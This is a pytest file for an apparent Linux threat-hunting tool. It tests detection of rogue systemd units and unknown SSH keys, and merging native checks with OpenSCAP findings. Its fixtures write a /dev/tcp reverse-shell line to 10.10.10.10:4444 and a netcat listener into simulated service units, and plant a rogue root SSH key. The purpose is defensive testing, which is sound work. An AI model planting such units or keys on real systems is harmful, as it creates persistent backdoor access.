"""Edge cases in unit-file parsing, the known-key allowlist, and pairing native checks with OpenSCAP."""
from __future__ import annotations

import pytest

from cyberthunder.adapters.base import make_finding
from cyberthunder.adapters.linux import checks, rules
from cyberthunder.adapters.linux.fixes import NATIVE
from cyberthunder.adapters.linux.simstate import ROGUE_KEY_BLOB
from cyberthunder.findings.schema import Status

from .conftest import collect_and_detect


def _unit(sim_transport, name, exec_line):
    sim_transport.state["files"][f"/etc/systemd/system/{name}"] = {
        "mode": 0o644, "owner": "root", "group": "root",
        "content": f"[Unit]\nDescription=x\n[Service]\n{exec_line}\n[Install]\nWantedBy=multi-user.target\n"}
    sim_transport.state["units"][name] = {"enabled": "enabled", "active": "active"}
    sim_transport._save()


def _open(findings):
    return {f.rule_id for f in findings if f.status == Status.OPEN}


def test_rogue_unit_with_spaced_equals_is_found(adapter, sim_target, sim_transport, tmp_path):
    _unit(sim_transport, "netcheck.service",
          "ExecStart = /bin/bash -c 'exec 3<>/dev/tcp/10.10.10.10/4444'")
    _, findings = collect_and_detect(adapter, sim_target, sim_transport, tmp_path)
    assert "hunt:linux:rogue_unit:netcheck.service" in _open(findings)


def test_rogue_unit_prefixed_exec_is_found(adapter, sim_target, sim_transport, tmp_path):
    _unit(sim_transport, "netcheck.service", "ExecStartPre=-/usr/bin/nc -l 9001")
    _, findings = collect_and_detect(adapter, sim_target, sim_transport, tmp_path)
    assert "hunt:linux:rogue_unit:netcheck.service" in _open(findings)


def test_dot_sh_wrapper_is_not_a_rogue_unit(adapter, sim_target, sim_transport, tmp_path):
    _unit(sim_transport, "acme.service", "ExecStart=/opt/acme/bin/start.sh --config /etc/acme.conf")
    _, findings = collect_and_detect(adapter, sim_target, sim_transport, tmp_path)
    assert "hunt:linux:rogue_unit:acme.service" not in _open(findings)


def test_known_key_comment_does_not_allowlist(adapter, sim_target, sim_transport, tmp_path):
    sim_transport.state["files"]["/root/.ssh/authorized_keys"]["content"] = \
        f"ssh-ed25519 {ROGUE_KEY_BLOB} itadmin@workstation\n"
    sim_transport._save()
    sim_target.options["known_keys"] = list(sim_target.options["known_keys"]) + ["itadmin@workstation"]
    _, findings = collect_and_detect(adapter, sim_target, sim_transport, tmp_path)
    assert any(r.startswith("hunt:linux:unknown_authorized_key:/root/.ssh/authorized_keys")
               for r in _open(findings))


STIGLESS = [r for r in NATIVE if r.stig_id is None and r.ssg]


@pytest.mark.parametrize("rule", STIGLESS, ids=[r.rule_id for r in STIGLESS])
def test_native_without_stig_id_merges_with_openscap(sim_target, rule):
    native = make_finding(target=sim_target, source="native", rule_id=rule.rule_id, title=rule.title,
                          severity=rule.severity, status="open", references=list(rule.refs),
                          fix_ref=rule.fix_ref, evidence="native evidence")
    oscap = make_finding(target=sim_target, source="openscap", rule_id=rules.SSG_PREFIX + rule.ssg,
                         title=rule.title, severity=rule.severity, status="open", rule_version="RHEL-09-211045",
                         fix_ref=rule.fix_ref)
    merged = checks.merge([native], [oscap])
    assert len(merged) == 1
    assert merged[0].source == "openscap" and "native-checked" in merged[0].tags
    assert merged[0].fix_ref == rule.fix_ref
